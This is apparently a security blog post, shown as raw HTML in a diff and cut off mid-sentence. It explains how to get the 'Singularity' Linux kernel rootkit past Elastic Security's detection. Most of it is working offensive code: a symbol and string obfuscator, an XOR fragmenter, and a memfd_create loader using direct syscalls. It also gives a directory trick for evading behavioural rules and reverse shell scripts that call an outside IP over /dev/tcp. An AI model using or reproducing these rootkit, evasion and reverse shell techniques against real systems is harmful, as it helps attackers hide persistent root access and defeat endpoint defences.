@@ -1,0 +1,1241 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Evading Elastic Security: Linux Rootkit Detection Bypass | 0xMatheuZ</title>
+<meta name="keywords" content="Evasion">
+<meta name="description" content="Bypassing YARA rules and behavioral detection through string obfuscation, module fragmentation, XOR encoding, and ICMP reverse shell staging">
+<meta name="author" content="0xMatheuZ">
+<link rel="canonical" href="http://localhost:1313/hacking/bypassing-elastic/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/hacking/bypassing-elastic/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Evading Elastic Security: Linux Rootkit Detection Bypass" />
+<meta property="og:description" content="Bypassing YARA rules and behavioral detection through string obfuscation, module fragmentation, XOR encoding, and ICMP reverse shell staging" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/hacking/bypassing-elastic/" /><meta property="og:image" content="https://i.imgur.com/5vHDN0B.png" /><meta property="article:section" content="hacking" />
+
+<meta property="og:site_name" content="0xMatheuZ" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://i.imgur.com/5vHDN0B.png"/>
+
+<meta name="twitter:title" content="Evading Elastic Security: Linux Rootkit Detection Bypass"/>
+<meta name="twitter:description" content="Bypassing YARA rules and behavioral detection through string obfuscation, module fragmentation, XOR encoding, and ICMP reverse shell staging"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hackings",
+      "item": "http://localhost:1313/hacking/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Evading Elastic Security: Linux Rootkit Detection Bypass",
+      "item": "http://localhost:1313/hacking/bypassing-elastic/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Evading Elastic Security: Linux Rootkit Detection Bypass",
+  "name": "Evading Elastic Security: Linux Rootkit Detection Bypass",
+  "description": "Bypassing YARA rules and behavioral detection through string obfuscation, module fragmentation, XOR encoding, and ICMP reverse shell staging",
+  "keywords": [
+    "Evasion"
+  ],
+  "articleBody": " Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security’s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: String Obfuscation The Problem The Solution: Compile-Time String Fragmentation Implementation Evasion Technique 2: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 3: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 4: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \"license=GPL\" Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let’s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: String Obfuscation The Problem Elastic’s YARA rules scan for static strings like “GPL” and “kallsyms_lookup_name”. A simple strings command on our module would expose these signatures immediately.\nThe specific rule (5d17781b) detects:\n$str = \"kallsyms_lookup_name_t\" $lic1 = \"license=Dual BSD/GPL\" $lic2 = \"license=GPL\" The Solution: Compile-Time String Fragmentation Our obfuscator breaks strings into separate compile-time constants that the C compiler concatenates during compilation. This prevents contiguous strings from appearing in the binary.\nImplementation def _obfuscate_license_strings(self, content: str) -\u003e str: \"\"\" Obfuscates MODULE_LICENSE/AUTHOR/DESCRIPTION strings To evade YARA rule: Linux.Rootkit.Generic (5d17781b) The rule detects: kallsyms_lookup_name_t AND license=GPL \"\"\" # 1. Obfuscate MODULE_LICENSE(\"GPL\") # Transform: MODULE_LICENSE(\"GPL\") # Into: MODULE_LICENSE(\"G\" \"P\" \"L\") content = re.sub( r'MODULE_LICENSE\\s*\\(\\s*\"GPL\"\\s*\\)', 'MODULE_LICENSE(\"G\" \"P\" \"L\")', content ) # 2. Obfuscate MODULE_LICENSE(\"Dual BSD/GPL\") content = re.sub( r'MODULE_LICENSE\\s*\\(\\s*\"Dual BSD/GPL\"\\s*\\)', 'MODULE_LICENSE(\"Dual\" \" \" \"BSD\" \"/\" \"GPL\")', content ) # 3. Obfuscate MODULE_AUTHOR content = re.sub( r'MODULE_AUTHOR\\s*\\(\\s*\"([^\"]+)\"\\s*\\)', lambda m: f'MODULE_AUTHOR(\"{self._split_string(m.group(1))}\")', content ) # 4. Obfuscate MODULE_DESCRIPTION content = re.sub( r'MODULE_DESCRIPTION\\s*\\(\\s*\"([^\"]+)\"\\s*\\)', lambda m: f'MODULE_DESCRIPTION(\"{self._split_string(m.group(1))}\")', content ) return content String Splitting Helper def _split_string(self, text: str) -\u003e str: \"\"\"Divide string in parts for obfuscation\"\"\" if len(text) \u003c= 3: return '\" \"'.join(list(text)) # Divide into chunks of 2-4 characters chunks = [] i = 0 while i \u003c len(text): chunk_size = random.randint(2, min(4, len(text) - i)) chunks.append(text[i:i+chunk_size]) i += chunk_size return '\" \"'.join(chunks) Before Obfuscation\nMODULE_LICENSE(\"GPL\"); MODULE_AUTHOR(\"MatheuZSecurity\"); MODULE_DESCRIPTION(\"Rootkit Researchers: https://discord.gg/66N5ZQppU7\"); After Obfuscation\nMODULE_LICENSE(\"G\" \"P\" \"L\"); MODULE_AUTHOR(\"Mathe\" \"uZ\" \"Secur\" \"ity\"); MODULE_DESCRIPTION(\"Root\" \"kit \" \"Rese\" \"arche\" \"rs: \" \"http\" \"s://\" \"disc\" \"ord.\" \"gg/6\" \"6N5Z\" \"QppU\" \"7\"); Why This Works The C compiler concatenates adjacent string literals during compilation according to the C standard:\nAdjacent string literal tokens are concatenated This means:\n\"Hello\" \" \" \"World\" // Becomes \"Hello World\" at compile time The binary’s .rodata section stores this as a single contiguous string. However, the key insight: YARA rules scan the binary, not the source code. By fragmenting strings in source but allowing compiler concatenation, we break YARA pattern matching while maintaining functionality.\nVerification\n# Check for GPL string strings obfuscated/singularity.ko | grep -i \"GPL\" # No results # But the module still loads correctly modinfo obfuscated/singularity.ko | grep license # license: GPL # The string exists in .modinfo section but fragmented objdump -s obfuscated/singularity.ko -j .modinfo | grep -A2 license Kallsyms Obfuscation Similarly, we obfuscate kallsyms_lookup_name references:\ndef _obfuscate_kallsyms_strings(self, content: str) -\u003e str: \"\"\" Obfuscates kallsyms_lookup_name references that are detected by Elastic \"\"\" # Obfuscate kallsyms_lookup_name_t content = re.sub( r'kallsyms_lookup_name_t', 'k' 'a' 'l' 'l' 's' 'y' 'm' 's' '_' 'l' 'o' 'o' 'k' 'u' 'p' '_' 'n' 'a' 'm' 'e' '_' 't', content ) # Obfuscate kallsyms references content = re.sub( r'kallsyms_lookup_name', 'k' 'a' 'l' 'l' 's' 'y' 'm' 's' '_' 'l' 'o' 'o' 'k' 'u' 'p' '_' 'n' 'a' 'm' 'e', content ) return content Evasion Technique 2: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic’s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \"rootkit\" $rk2 = \"hide_\" $rk3 = \"hacked_\" $rk4 = \"fake_\" $rk5 = \"hooked_\" $hook1 = \"_getdents\" $hook2 = \"_kill\" $hook3 = \"_tcp4_seq_show\" The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u003e str: \"\"\"Generates random name that avoids YARA patterns\"\"\" # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = ['sys', 'kern', 'dev', 'mm', 'fs', 'net', 'proc', 'sched'] suffixes = ['handler', 'helper', 'worker', 'ops', 'func', 'entry', 'cb'] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\"{prefix}_{middle}_{suffix}\" Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u003e Set[str]: \"\"\"Names from kernel that should NOT be changed\"\"\" return { # Basic C types 'int', 'void', 'long', 'char', 'size_t', 'ssize_t', # Essentials 'module_init', 'module_exit', 'THIS_MODULE', 'current', 'kmalloc', 'kfree', 'printk', 'pr_debug', 'copy_from_user', 'copy_to_user', 'fget', 'fput', 'kernel_read', # Structures 'pt_regs', 'file', 'task_struct', 'sk_buff', # Entry points 'main', 'init', 'exit', } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r'\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(', r'\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(', r'\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(', r'\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?', r'\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)', r'\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)', r'\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,', r'\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;', ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u003e str: \"\"\"Replace names in content\"\"\" modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r'\\b' + re.escape(old_name) + r'\\b' modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 3: Module Fragmentation The Problem EDR solutions scan loaded kernel modules in both memory and on-disk. A monolithic .ko file presents a single attack surface that’s easy to analyze:\nSignature scanning of the entire module Static analysis of ELF structure Symbol table enumeration The Solution: Fragment + XOR Encoding + In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static analysis while maintaining functionality.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u003e List[bytes]: \"\"\" Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \"\"\" print(f\"\\n[*] Fragmenting: {self.ko_path}\") print(f\" Chunk size: {chunk_size} bytes\") # Read the .ko file with open(self.ko_path, 'rb') as f: ko_data = f.read() original_size = len(ko_data) print(f\"[+] Original size: {original_size} bytes\") # Generate random XOR key xor_key = os.urandom(16) if encode else b'\\x00' * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\"[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\") self.fragments = fragments # Metadata self.metadata = { 'original_filename': self.ko_path.name, 'original_size': original_size, 'num_fragments': len(fragments), 'chunk_size': chunk_size, 'encoded': encode, 'xor_key': xor_key.hex() if encode else None, 'checksums': [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u003e bytes: \"\"\"Simple XOR encoding for obfuscation\"\"\" encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose:\nBreaks signature matching Fast to encode/decode Minimal overhead Easy to implement in C loader Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \"original_filename\": \"singularity.ko\", \"original_size\": 245632, \"num_fragments\": 4, \"chunk_size\": 65536, \"encoded\": true, \"xor_key\": \"a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\", \"checksums\": [ \"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\", \"cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\", \"2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\", \"fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\" ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding * 4. Uses memfd_create to avoid disk * 5. Direct syscall to avoid libc wrapper * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include #include #include #include #include #include #include #include #include #include // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\"r10\") = arg3; asm volatile( \"syscall\" : \"=a\" (ret) : \"0\" (number), \"D\" (arg1), \"S\" (arg2), \"d\" (r10) : \"rcx\", \"r11\", \"memory\" ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \"int $0x80\" : \"=a\" (ret) : \"0\" (number), \"b\" (arg1), \"c\" (arg2), \"d\" (arg3) : \"memory\" ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u003c 0) { fprintf(stderr, \"[!] memfd_create failed: %s\\n\", strerror(-fd)); return -1; } printf(\"[+] memfd created: fd=%ld (%s)\\n\", fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs)\nAutomatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc//fd/\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u003c len; i++) { data[i] ^= key[i % key_len]; } } Fragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\"[!] opendir\"); return -1; } struct dirent *entry; int count = 0; printf(\"[*] Scanning fragments in: %s\\n\", dir_path); while ((entry = readdir(dir)) != NULL \u0026\u0026 count \u003c MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u003ed_name, \"chunk_\", 6) == 0 \u0026\u0026 strstr(entry-\u003ed_name, \".bin\") != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \"%s/%s\", dir_path, entry-\u003ed_name); // Extract index int idx = atoi(entry-\u003ed_name + 6); // Read fragment FILE *f = fopen(filepath, \"rb\"); if (!f) { fprintf(stderr, \"[!] Error opening %s\\n\", filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\"[+] Fragment %d: %s (%ld bytes)\\n\", idx, entry-\u003ed_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u003c count - 1; i++) { for (int j = 0; j \u003c count - i - 1; j++) { if (fragments[j].index \u003e fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\"[*] Loading module via direct syscall...\\n\"); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u003c 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u003c 0) { fprintf(stderr, \"[!] finit_module failed: %s\\n\", strerror(-ret)); return -1; } printf(\"[+] Module loaded successfully!\\n\"); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026is_encoded); // 3. Create memfd int memfd = create_memfd(\"module\"); // 4. Reconstruct module in memfd for (int i = 0; i \u003c num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Memory-only module existence Static Analysis Resistance:\nIndividual fragments don’t match YARA signatures XOR encoding breaks pattern matching No complete ELF structure visible on disk Evasion Technique 4: Ftrace Helper Obfuscation The Problem Elastic’s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \"fh_install_hook\" $str2 = \"fh_remove_hook\" $str3 = \"fh_resolve_hook_address\" Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u003eaddress = kallsyms_lookup_name(hook-\u003ename); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026hook-\u003eops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u003c count; i++) { err = fh_install_hook(\u0026hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u003c count; i++) fh_remove_hook(\u0026hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u003eaddress = kallsyms_lookup_name(hook-\u003ename); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026hook-\u003eops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u003c count; i++) { err = sys_zmnpqr_ops(\u0026hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u003c count; i++) net_abqzpx_handler(\u0026hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn’t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \"[*] Singularity Build\" rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \"[1] Obfuscating and compiling...\" python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026\u0026 make \u0026\u0026 cd .. # 2. Fragment the .ko echo \"[2] Fragmenting module...\" python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \"[4] Cleaning build artifacts...\" rm -rf obfuscated echo \"[+] Build complete! Final files:\" echo \" - fragments/ (module fragments)\" echo \" - loader\" echo \" - NO obfuscated code left behind\" Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security’s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nI think elastic’s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware (thinking like an attacker, I would clearly use /dev/shm to download and use exploits in that directory). Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic’s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n“Suspicious Execution via setsid and nohup” (Risk: 73) “Shell Command Execution via Kworker” (Risk: 99) Elastic’s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \"exec\" and process.name in (\"sh\", \"bash\", \"zsh\", \"dash\", \"zmodload\") and process.command_line like~ (\"*/dev/tcp/*\", \"*/dev/udp/*\", \"*zsh/net/tcp*\", \"*zsh/net/udp*\") The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \"bash -c '\" \"PID=$$; \" \"kill -59 $PID; \" \"exec -a \\\"%s\\\" /bin/bash \u0026\u003e/dev/tcp/%s/%s 0\u003e\u00261\" \"' \u0026\", PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\"/usr/bin/setsid\", \"/bin/bash\", \"-c\", cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \"/singularity\" // Hide kworker immediately add_hidden_pid(current-\u003epid); // Create script with automatic process hiding snprintf(script, sizeof(script), \"#!/bin/bash\\n\" \"exec 196\u003c\u003e/dev/tcp/%s/%s\\n\" \"sh \u003c\u0026196 \u003e\u0026196 2\u003e\u0026196 \u0026\\n\" \"SHELL_PID=$!\\n\" \"sleep 1\\n\" \"kill -59 $SHELL_PID\\n\" \"kill -59 $$\\n\", YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026pos); 2. Execute with clean command line:\nchar *argv[] = {\"/bin/bash\", SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u003epid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u003c\u003e/dev/tcp/192.168.200.164/8081 sh \u003c\u0026196 \u003e\u0026196 2\u003e\u0026196 \u0026 SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background 